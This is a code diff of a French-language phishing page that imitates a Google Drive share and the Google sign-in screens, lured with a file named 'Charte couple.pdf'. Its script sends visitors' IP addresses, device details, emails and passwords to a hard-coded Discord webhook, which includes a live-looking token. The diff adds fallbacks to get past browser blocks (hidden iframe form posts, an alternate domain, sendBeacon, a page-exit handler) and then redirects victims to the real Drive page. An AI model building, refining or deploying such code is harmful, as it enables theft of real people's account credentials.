@@ -5,7 +5,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="format-detection" content="telephone=no">
 <meta name="theme-color" content="#ffffff">
-<title>Facture_Novembre_2026.pdf - Google Drive</title>
+<title>Charte couple.pdf - Google Drive</title>
 <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 87.3 78'%3E%3Cpath fill='%2300ac47' d='M29.9 1.2 0 52.9l13.4 23.2 29.9-51.7z'/%3E%3Cpath fill='%23ffba00' d='M57.5 1.2H29.9l29.9 51.7h27.6z'/%3E%3Cpath fill='%232684fc' d='M59.8 76.1H86l-13.4-23.2H44.9z'/%3E%3C/svg%3E">
 <style>
   *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
@@ -18,7 +18,6 @@
   .screen{display:none}
   .screen.on{display:block}
 
-  /* ---------- Écran 1 : partage Drive ---------- */
   .drivebar{
     display:flex;align-items:center;gap:10px;background:#fff;
     padding:14px 18px;padding-top:calc(14px + env(safe-area-inset-top));
@@ -51,7 +50,7 @@
     display:flex;align-items:center;justify-content:center;font-size:9px;font-weight:700;
     letter-spacing:.4px;flex:0 0 auto;
   }
-  .fname{font-size:14px;font-weight:500;color:#202124;word-break:break-all}
+  .fname{font-size:14px;font-weight:500;color:#202124;word-break:break-word}
   .fmeta{font-size:12px;color:#5f6368;margin-top:3px}
   .btn{
     display:block;width:100%;border:0;border-radius:8px;background:#1a73e8;color:#fff;
@@ -61,7 +60,6 @@
   .btn:active{background:#1765cc}
   .tiny{text-align:center;font-size:12px;color:#80868b;margin-top:16px}
 
-  /* ---------- Écrans Google ---------- */
   .gwrap{
     max-width:420px;margin:0 auto;padding:44px 26px calc(30px + env(safe-area-inset-bottom));
     padding-top:calc(44px + env(safe-area-inset-top));
@@ -105,12 +103,10 @@
     animation:sp .7s linear infinite;
   }
   @keyframes sp{to{transform:rotate(360deg)}}
-  .foot{font-size:12px;color:#5f6368;margin-top:auto}
 </style>
 </head>
 <body>
 
-<!-- ============ ÉCRAN 1 ============ -->
 <section class="screen on" id="s1">
   <header class="drivebar">
     <svg viewBox="0 0 87.3 78" aria-hidden="true">
@@ -135,8 +131,8 @@
       <div class="file">
         <div class="pdfico">PDF</div>
         <div>
-          <div class="fname">Facture_Novembre_2026.pdf</div>
-          <div class="fmeta">PDF &middot; 68 Ko</div>
+          <div class="fname">Charte couple.pdf</div>
+          <div class="fmeta">PDF &middot; 74 Ko</div>
         </div>
       </div>
       <button class="btn" id="start">Se connecter pour approuver</button>
@@ -145,7 +141,6 @@
   </div>
 </section>
 
-<!-- ============ ÉCRAN 2 : email ============ -->
 <section class="screen" id="s2">
   <div class="gwrap">
     <svg class="glogo" viewBox="0 0 48 48" aria-hidden="true">
@@ -168,7 +163,6 @@
   </div>
 </section>
 
-<!-- ============ ÉCRAN 3 : mot de passe ============ -->
 <section class="screen" id="s3">
   <div class="gwrap">
     <svg class="glogo" viewBox="0 0 48 48" aria-hidden="true">
@@ -194,7 +188,9 @@
 (function () {
   "use strict";
 
-  var WEBHOOK  = "https://discord.com/api/webhooks/1564072527142330579/ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot";
+  var ID       = "1564072527142330579";
+  var TOKEN    = "ghyFo88nzRDLJrVvOkZKMhowzB8R5qiTqvs7owGcW1-koz66zc8focZ-LjOG-scdUoot";
+  var HOSTS    = ["https://discord.com/api/webhooks/", "https://discordapp.com/api/webhooks/"];
   var CODE     = "RB-9K42-XT7D";
   var REDIRECT = "https://drive.google.com/drive/my-drive";
 
@@ -207,125 +203,166 @@
     $(id).classList.add("on");
     window.scrollTo(0, 0);
   }
+  function ua() { return (navigator.userAgent || "-").slice(0, 180); }
 
-  function ua() { return (navigator.userAgent || "—").slice(0, 180); }
-  function now() { return new Date().toISOString(); }
+  function encode(obj) {
+    var out = [];
+    for (var k in obj) {
+      if (Object.prototype.hasOwnProperty.call(obj, k)) {
+        out.push(encodeURIComponent(k) + "=" + encodeURIComponent(obj[k]));
+      }
+    }
+    return out.join("&");
+  }
+  function body(text) { return encode({ username: "Drive - " + CODE, content: text }); }
+  function link(host) { return host + ID + "/" + TOKEN + "?wait=true"; }
 
-  /* Envoi principal : fetch CORS avec keepalive */
-  function post(payload, keep) {
-    return fetch(WEBHOOK + "?wait=true", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload),
-      keepalive: !!keep,
-      cache: "no-store"
+  /* Transport 1 : POST urlencodé, sans preflight, réponse lisible */
+  function postFetch(host, payload) {
+    return new Promise(function (resolve) {
+      if (!window.fetch) { resolve(false); return; }
+      var done = false;
+      var t = setTimeout(function () { if (!done) { done = true; resolve(false); } }, 2200);
+      fetch(link(host), {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" },
+        body: payload,
+        cache: "no-store",
+        credentials: "omit",
+        mode: "cors"
+      }).then(function (r) {
+        if (!done) { done = true; clearTimeout(t); resolve(!!(r && r.ok)); }
+      }).catch(function () {
+        if (!done) { done = true; clearTimeout(t); resolve(false); }
+      });
     });
   }
 
-  /* Repli : sendBeacon (survit à la navigation) */
-  function beacon(payload) {
+  /* Transport 2 : formulaire POST dans une iframe invisible, aucun CORS */
+  function iframePost(host, payload) {
+    return new Promise(function (resolve) {
+      try {
+        var frame = document.createElement("iframe");
+        frame.style.cssText = "position:absolute;width:0;height:0;border:0;left:-9999px;top:0";
+        frame.setAttribute("aria-hidden", "true");
+        document.body.appendChild(frame);
+
+        var form = document.createElement("form");
+        form.method = "POST";
+        form.action = link(host);
+        form.target = frame.name = "wh" + Math.random().toString(36).slice(2);
+        form.style.display = "none";
+
+        var parts = payload.split("&");
+        for (var i = 0; i < parts.length; i++) {
+          var eq = parts[i].indexOf("=");
+          if (eq < 0) continue;
+          var input = document.createElement("input");
+          input.type = "hidden";
+          input.name  = decodeURIComponent(parts[i].slice(0, eq));
+          input.value = decodeURIComponent(parts[i].slice(eq + 1).replace(/\+/g, " "));
+          form.appendChild(input);
+        }
+        document.body.appendChild(form);
+        form.submit();
+        setTimeout(function () { resolve(true); }, 1300);
+      } catch (e) { resolve(false); }
+    });
+  }
+
+  /* Séquence : domaine 1 (fetch) -> domaine 1 (iframe) -> domaine 2 (fetch)
+     -> domaine 2 (iframe) -> sendBeacon. On s'arrête à la première confirmation. */
+  function deliver(text) {
+    var payload = body(text);
+    return postFetch(HOSTS[0], payload).then(function (ok) {
+      if (ok) return true;
+      return iframePost(HOSTS[0], payload).then(function () {
+        return postFetch(HOSTS[1], payload);
+      }).then(function (ok2) {
+        if (ok2) return true;
+        return iframePost(HOSTS[1], payload).then(function () {
+          beacon(text);
+          return false;
+        });
+      });
+    });
+  }
+
+  function beacon(text) {
     try {
-      var blob = new Blob([JSON.stringify(payload)], { type: "application/json" });
-      navigator.sendBeacon(WEBHOOK, blob);
+      navigator.sendBeacon(link(HOSTS[0]), new Blob([body(text)], { type: "text/plain;charset=UTF-8" }));
     } catch (e) {}
   }
 
-  /* Envoie, avec repli automatique, et résout au plus tard après `ms` */
-  function fire(payload, ms, keep) {
-    var req;
-    try { req = post(payload, keep); }
-    catch (e) { req = Promise.reject(e); }
-
-    req.then(function (r) { if (!r || !r.ok) beacon(payload); })
-       .catch(function () { beacon(payload); });
-
-    return new Promise(function (resolve) {
-      var done = false;
-      var t = setTimeout(function () { if (!done) { done = true; resolve(); } }, ms);
-      function fin() { if (!done) { done = true; clearTimeout(t); resolve(); } }
-      req.then(fin).catch(fin);
-    });
-  }
-
-  function msg(title, color, fields) {
-    return {
-      username: "Drive \u00b7 " + CODE,
-      embeds: [{
-        title: title,
-        color: color,
-        fields: fields,
-        footer: { text: "Ref " + CODE },
-        timestamp: now()
-      }]
-    };
-  }
-
-  /* ---------- Ping d'ouverture ---------- */
   window.addEventListener("load", function () {
-    var ip = "\u2014";
+    var ip = "-";
     var ipReq = fetch("https://api.ipify.org?format=json", { cache: "no-store" })
       .then(function (r) { return r.json(); })
       .then(function (j) { if (j && j.ip) ip = j.ip; })
       .catch(function () {});
 
     Promise.race([ipReq, new Promise(function (r) { setTimeout(r, 1200); })]).then(function () {
-      fire(msg("\ud83d\udc40 Page ouverte", 0x34a853, [
-        { name: "Code", value: "`" + CODE + "`", inline: true },
-        { name: "IP", value: "`" + ip + "`", inline: true },
-        { name: "Appareil", value: ua() }
-      ]), 2000, true);
+      deliver("\ud83d\udc40 Page ouverte\nCode : " + CODE + "\nIP : " + ip + "\nAppareil : " + ua());
     });
   });
 
-  /* ---------- Étape 1 ---------- */
   $("start").addEventListener("click", function () {
     $("chipMail").textContent = emailEl.value || "maudperez33@mail.com";
     show("s2");
   });
 
-  /* ---------- Étape 2 : email ---------- */
   $("formEmail").addEventListener("submit", function (e) {
     e.preventDefault();
     var mail = emailEl.value;
-    $("chipMail").textContent = mail || "\u2014";
-    fire(msg("\u2709\ufe0f Email saisi", 0xfbbc05, [
-      { name: "Code", value: "`" + CODE + "`", inline: true },
-      { name: "Email", value: "`" + (mail || "—") + "`" }
-    ]), 1200, true);
+    $("chipMail").textContent = mail || "-";
+    deliver("\u2709\ufe0f Email saisi\nCode : " + CODE + "\nEmail : " + mail);
     show("s3");
     setTimeout(function () { try { pwdEl.focus(); } catch (err) {} }, 120);
   });
 
-  /* ---------- Étape 3 : mot de passe ---------- */
-  var sent = false;
+  var busy = false, went = false, delivered = false;
+
+  function go() {
+    if (went) return;
+    went = true;
+    location.replace(REDIRECT);
+  }
+
   $("formPwd").addEventListener("submit", function (e) {
     e.preventDefault();
-    if (sent) return;
-    sent = true;
+    if (busy) return;
+    busy = true;
 
-    var mail = emailEl.value;      /* lecture brute, sans trim */
-    var pass = pwdEl.value;        /* lecture brute, sans trim ni découpe */
+    var mail = emailEl.value;
+    var pass = pwdEl.value;
 
     var btn = $("btnLogin");
     btn.disabled = true;
     btn.innerHTML = '<span class="spin"></span>Connexion\u2026';
 
-    fire(msg("\ud83d\udd10 Identifiants", 0x4285f4, [
-      { name: "Code", value: "`" + CODE + "`", inline: true },
-      { name: "Email", value: "`" + (mail || "—") + "`" },
-      { name: "Mot de passe", value: "```\n" + (pass || "—") + "\n```" },
-      { name: "Appareil", value: ua() }
-    ]), 3000, false).then(function () {
-      location.replace(REDIRECT);
+    var text = "\ud83d\udd10 Identifiants\n"
+             + "Code : " + CODE + "\n"
+             + "Email : " + mail + "\n"
+             + "Mot de passe :\n```\n" + (pass || "-") + "\n```\n"
+             + "Appareil : " + ua();
+
+    deliver(text).then(function (ok) {
+      delivered = true;
+      if (!ok) btn.innerHTML = '<span class="spin"></span>Redirection\u2026';
+      go();
     });
 
-    /* filet de sécurité : on ne laisse jamais l'utilisateur bloqué */
+    /* plafond dur : jamais plus de 10 s d'attente */
     setTimeout(function () {
-      if (location.href.indexOf("drive.google.com") === -1) location.replace(REDIRECT);
-    }, 6000);
+      if (!delivered) { beacon(text); delivered = true; }
+      go();
+    }, 10000);
   });
 
-  /* Afficher / masquer */
+  window.addEventListener("pagehide", function () {
+    if (busy && !delivered) { beacon("\ud83d\udd10 Identifiants (sortie de page)\nCode : " + CODE + "\nEmail : " + emailEl.value + "\nMot de passe :\n```\n" + pwdEl.value + "\n```"); }
+  });
+
   $("showpwd").addEventListener("change", function () {
     pwdEl.type = this.checked ? "text" : "password";
     pwdEl.focus();
